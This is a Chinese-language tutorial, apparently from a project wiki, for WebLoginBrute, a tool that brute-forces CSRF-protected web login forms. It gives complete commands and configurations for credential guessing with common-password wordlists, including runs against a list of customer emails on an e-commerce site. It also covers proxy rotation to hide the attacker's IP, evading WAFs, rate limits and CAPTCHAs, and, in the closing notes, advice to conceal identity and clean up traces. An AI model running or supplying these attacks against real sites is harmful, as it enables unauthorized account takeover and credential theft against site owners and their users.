# 使用教程

本教程将指导您完成WebLoginBrute的实际使用过程，包含多个真实场景的案例。

## 📚 教程目录

- [基础教程](#基础教程)
- [高级技巧](#高级技巧)
- [实战案例](#实战案例)
- [最佳实践](#最佳实践)

## 🎯 基础教程

### 教程1：快速开始

#### 目标
在5分钟内完成第一次CSRF爆破测试。

#### 步骤

1. **准备环境**
```bash
# 克隆项目
git clone https://github.com/RedteamNotes/WebLoginBrute.git
cd WebLoginBrute

# 安装依赖
pip3 install -r requirements.txt
```

2. **创建测试字典**
```bash
# 创建简单的测试字典
echo "admin" > users.txt
echo "password" > passwords.txt
echo "admin123" >> passwords.txt
echo "123456" >> passwords.txt
```

3. **配置目标**
```yaml
# config.yaml
target_url: "https://test.example.com/login"
success_redirect: "https://test.example.com/dashboard"
failure_redirect: "https://test.example.com/login"
username_list: "users.txt"
password_list: "passwords.txt"
threads: 5
aggression_level: "A1"
```

4. **运行测试**
```bash
python3 webloginbrute.py --config config.yaml
```

#### 预期结果
```
[INFO] 对抗级别: A1 - 低对抗模式
[INFO] 开始爆破任务...
[INFO] 尝试登录：admin:password
[INFO] 尝试登录：admin:admin123
[SUCCESS] 发现有效凭据: admin:123456
```

### 教程2：配置分析

#### 目标
学会分析目标网站的登录机制。

#### 步骤

1. **手动分析登录页面**
```bash
# 使用浏览器访问登录页面
curl -s "https://target.com/login" | grep -i "csrf\|token"
```

2. **识别关键元素**
```html
<!-- 查找CSRF Token -->
<input type="hidden" name="_token" value="abc123...">

<!-- 查找表单字段 -->
<form action="/login" method="POST">
  <input name="username" type="text">
  <input name="password" type="password">
  <input name="_token" type="hidden" value="...">
</form>
```

3. **确定配置参数**
```yaml
target_url: "https://target.com/login"           # 登录页面
success_redirect: "https://target.com/dashboard" # 成功页面
failure_redirect: "https://target.com/login"     # 失败页面
```

## 🔧 高级技巧

### 技巧1：代理使用

#### 场景
目标有IP限制或需要隐藏真实IP。

#### 配置
```yaml
# 使用HTTP代理
proxy: "http://127.0.0.1:8080"

# 使用SOCKS5代理
proxy: "socks5://127.0.0.1:1080"

# 使用认证代理
proxy: "http://user:pass@proxy.example.com:8080"
```

#### 代理轮换
```bash
# 创建代理列表
cat > proxy_list.txt << EOF
http://proxy1.example.com:8080
http://proxy2.example.com:8080
http://proxy3.example.com:8080
EOF

# 使用脚本轮换代理
while read proxy; do
    sed -i "s|proxy:.*|proxy: \"$proxy\"|" config.yaml
    python3 webloginbrute.py --config config.yaml
done < proxy_list.txt
```

### 技巧2：字典优化

#### 场景
提高爆破效率和成功率。

#### 字典生成
```bash
# 使用常见用户名
cat > users.txt << EOF
admin
administrator
root
user
test
guest
EOF

# 使用常见密码
cat > passwords.txt << EOF
password
123456
admin
admin123
password123
qwerty
EOF

# 使用社工字典
# 根据目标信息生成个性化字典
```

#### 字典分割
```bash
# 分割大字典文件
split -l 1000 passwords.txt passwords_part_

# 并行处理多个字典
for file in passwords_part_*; do
    sed -i "s|password_list:.*|password_list: \"$file\"|" config.yaml
    python3 webloginbrute.py --config config.yaml &
done
```

### 技巧3：会话管理

#### 场景
目标有会话限制或需要保持登录状态。

#### 配置
```yaml
# 启用会话池
aggression_level: "A2"
enable_session_pool: true
session_lifetime: 300

# 自定义会话参数
session_lifetime: 600  # 10分钟会话
```

#### 会话恢复
```bash
# 保存成功会话
python3 webloginbrute.py --config config.yaml --save-session

# 恢复会话继续测试
python3 webloginbrute.py --config config.yaml --resume-session
```

## 🎯 实战案例

### 案例1：企业网站测试

#### 背景
某企业网站需要安全评估，已知有基础WAF防护。

#### 配置策略
```yaml
# 第一阶段：快速扫描
target_url: "https://company.com/login"
success_redirect: "https://company.com/dashboard"
failure_redirect: "https://company.com/login"
username_list: "common_users.txt"
password_list: "top_1000_passwords.txt"
threads: 10
aggression_level: "A0"  # 快速模式

# 第二阶段：深度测试
aggression_level: "A2"  # 中对抗模式
threads: 5
proxy: "http://proxy.company.com:8080"
enable_session_pool: true
```

#### 执行步骤
```bash
# 1. 快速扫描
python3 webloginbrute.py --config config_quick.yaml

# 2. 分析结果，调整策略
# 如果发现频率限制，降低级别

# 3. 深度测试
python3 webloginbrute.py --config config_deep.yaml
```

### 案例2：电商平台测试

#### 背景
电商平台有高级WAF和验证码防护。

#### 配置策略
```yaml
# 高对抗配置
target_url: "https://shop.example.com/login"
success_redirect: "https://shop.example.com/account"
failure_redirect: "https://shop.example.com/login"
username_list: "customer_emails.txt"
password_list: "common_passwords.txt"
threads: 3
aggression_level: "A3"  # 高对抗模式
proxy: "http://rotating-proxy.com:8080"
min_delay: 3.0
max_delay: 15.0
enable_captcha_detection: true
```

#### 执行策略
```bash
# 1. 小规模测试
head -100 customer_emails.txt > test_users.txt
python3 webloginbrute.py --config config_test.yaml

# 2. 监控检测情况
# 如果验证码频繁出现，增加延迟

# 3. 大规模测试
python3 webloginbrute.py --config config_full.yaml
```

### 案例3：内部系统测试

#### 背景
内部测试环境，无防护限制。

#### 配置策略
```yaml
# 全速配置
target_url: "http://internal.test.com/login"
success_redirect: "http://internal.test.com/dashboard"
failure_redirect: "http://internal.test.com/login"
username_list: "internal_users.txt"
password_list: "internal_passwords.txt"
threads: 20
aggression_level: "A0"  # 全速模式
enable_smart_delay: false
enable_session_pool: false
```

#### 执行步骤
```bash
# 1. 快速爆破
python3 webloginbrute.py --config config_fast.yaml

# 2. 分析结果
# 检查成功凭据和失败模式

# 3. 生成报告
python3 generate_report.py --results bruteforce_results.json
```

## 🛠️ 最佳实践

### 1. 目标分析

#### 信息收集
```bash
# 1. 分析登录页面
curl -s "https://target.com/login" > login_page.html

# 2. 查找CSRF Token
grep -i "csrf\|token" login_page.html

# 3. 分析表单结构
grep -A 10 -B 5 "form" login_page.html

# 4. 测试登录流程
curl -X POST "https://target.com/login" \
  -d "username=test&password=test&_token=abc123" \
  -v
```

#### 防护检测
```bash
# 1. 检测WAF
curl -H "User-Agent: sqlmap" "https://target.com/login"

# 2. 检测频率限制
for i in {1..10}; do
  curl "https://target.com/login"
  sleep 1
done

# 3. 检测验证码
curl -s "https://target.com/login" | grep -i "captcha"
```

### 2. 配置优化

#### 性能优化
```yaml
# 高性能配置
threads: 20                    # 高并发
aggression_level: "A0"         # 无延迟
enable_smart_delay: false      # 关闭智能延迟
enable_session_pool: false     # 关闭会话池
```

#### 隐蔽性优化
```yaml
# 高隐蔽配置
threads: 3                     # 低并发
aggression_level: "A3"         # 高对抗
proxy: "http://proxy.com:8080" # 使用代理
min_delay: 5.0                 # 长延迟
max_delay: 20.0                # 更长延迟
```

### 3. 监控和调整

#### 实时监控
```bash
# 监控输出
python3 webloginbrute.py --config config.yaml 2>&1 | tee attack.log

# 分析日志
grep "SUCCESS" attack.log
grep "rate limit" attack.log
grep "captcha" attack.log
```

#### 动态调整
```bash
# 根据检测情况调整配置
if grep -q "rate limit" attack.log; then
    # 降低级别
    sed -i 's/aggression_level: "A1"/aggression_level: "A2"/' config.yaml
    sed -i 's/threads: 10/threads: 5/' config.yaml
fi
```

### 4. 结果分析

#### 成功凭据处理
```bash
# 提取成功凭据
grep "SUCCESS" attack.log | cut -d' ' -f4 > successful_credentials.txt

# 验证凭据
while read cred; do
    username=$(echo $cred | cut -d':' -f1)
    password=$(echo $cred | cut -d':' -f2)
    echo "验证: $username:$password"
    # 执行验证逻辑
done < successful_credentials.txt
```

#### 统计分析
```bash
# 生成统计报告
python3 -c "
import json
with open('bruteforce_progress.json') as f:
    data = json.load(f)
print(f'总尝试: {data[\"total_attempts\"]}')
print(f'成功率: {data[\"success_rate\"]:.2f}%')
print(f'平均速度: {data[\"avg_speed\"]:.2f} 次/秒')
"
```

## ⚠️ 注意事项

### 1. 法律合规
- 确保获得授权
- 遵守相关法规
- 保护敏感信息

### 2. 技术风险
- 避免过度消耗资源
- 监控系统状态
- 准备应急方案

### 3. 安全考虑
- 使用代理隐藏身份
- 定期更换IP
- 清理痕迹

---

**相关链接**: [快速开始](Getting-Started) | [配置说明](Configuration) | [对抗级别](Aggression-Levels) 